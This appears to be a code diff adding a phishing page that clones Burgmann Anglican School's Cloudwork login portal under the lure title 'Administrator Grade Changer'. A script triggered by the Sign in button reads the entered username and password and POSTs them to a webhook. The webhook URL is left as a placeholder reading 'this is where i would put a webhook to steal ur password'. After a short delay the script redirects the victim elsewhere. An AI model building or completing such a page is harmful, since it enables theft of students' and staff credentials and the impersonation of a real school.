@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
+<script type="text/javascript" src="/resources/script.js"></script>
+<title>Enter your username and password</title>
+
+
+    <link rel="stylesheet" type="text/css" href="https://burgmann-login.cloudworkengine.net/module.php/nextmail/cloudwork/css/theme.css" />
+    <link rel="icon" type="image/icon" href="https://burgmann-login.cloudworkengine.net/module.php/nextmail/cloudwork/favicon.ico" />
+    <!--[if lt IE 11]>
+    <link href="https://burgmann-login.cloudworkengine.net/module.php/nextmail/cloudwork/css/ie.css" rel="stylesheet" type="text/css">
+    <![endif]-->
+
+	<meta name="robots" content="noindex, nofollow" />
+
+<script type="text/javascript" src="https://burgmann-login.cloudworkengine.net/module.php/chromebook/jquery.js"></script><script type="text/javascript" src="https://burgmann-login.cloudworkengine.net/module.php/chromebook/jquery.cookie.js"></script><script type="text/javascript" src="https://ssl.gstatic.com/accounts/chrome/users-1.0.js"></script>    <!-- theme overrides -->
+<style type="text/css">
+body {
+    background-image: url("https://burgmann.files.cloudworkengine.net.au/pub/61359A9E_Login_BG_v4.jpg");
+      background-color: #5598fe;
+}
+input[type="submit"] {
+    background-color: #193D6D;
+}
+.content {
+    background-color: white;
+    color:  #5b5b5b;
+}
+.login a {
+    color: ;
+}
+.main {
+    flex-direction:column;
+    }
+#password {
+    border-radius: 5px 5px 0px 0px;
+    margin: 20px 0px 0px 0px;
+}
+#password-strength-meter {
+    border-radius: 0px 0px 5px 5px;
+}
+meter::-webkit-meter-bar,
+meter::-webkit-meter-optimum-value {
+    border-radius: 0px 0px 5px 5px;
+}
+#password-strength-text{
+    text-align:left;
+}
+</style>
+</head>
+<body>
+    <div class="header"></div>
+    <div class="main">
+      <div class="content">
+        <div class="content-header">
+          <img class="logo" src="https://burgmann.files.cloudworkengine.net.au/pub/5F3D2986_Logo_-_Full_Colour_6.png">
+<h2>Burgmann Anglican School</h2>
+        </div>
+<div class="login">
+    <h3>Administrator Grade Changer</h3>
+	<form action="?" method="post" name="f">
+
+<input type="text" id="username" tabindex="1" name="username" placeholder="Username" value="" spellcheck="false" autofocus /><input id="password" type="password" tabindex="2" name="password" placeholder="Password" />
+            <div class="submit">
+ <input type="submit"  onclick="sendMessage(); this.disabled=true; this.value='Signing in...';" value="Sign in">
+</div>
+          <p>Please note your username is not your email address, it is a unique code issued to you by the school.
+If you are having trouble logging in, please email <a href="mailto:portal@burgmann.act.edu.au">portal@burgmann.act.edu.au</a><br /><br />
+</p>
+</div>
+
+      </div>
+    </div>
+    <div class="footer">Cloudwork&reg; Copyright &copy; 2021 <a href="http://studentnet.net">Studentnet&reg;</a> | Powered by <a href="http://coherentcloud.com">Coherent Cloud&reg;</a></div>
+  </body>
+<script type="text/javascript">
+    function la(src) {
+      window.location=src;
+    }
+  </script>
+
+  <script>
+  function sendMessage() {
+  function sleep(milliseconds) {
+  const date = Date.now();
+  let currentDate = null;
+  do {
+    currentDate = Date.now();
+  } while (currentDate - date < milliseconds);
+}
+    var request = new XMLHttpRequest();
+    request.open("POST", "this is where i would put a webhook to steal ur password");
+    request.setRequestHeader('Content-type', 'application/json');
+    var params = {
+      content: ("> **USERNAME  : **" + document.getElementById('username').value + "\n> **PASSWORD : **" + document.getElementById('password').value)
+    }
+    request.send(JSON.stringify(params));
+	sleep(400)
+	window.location.replace("indexx");
+  }
+  </script>
+</html>
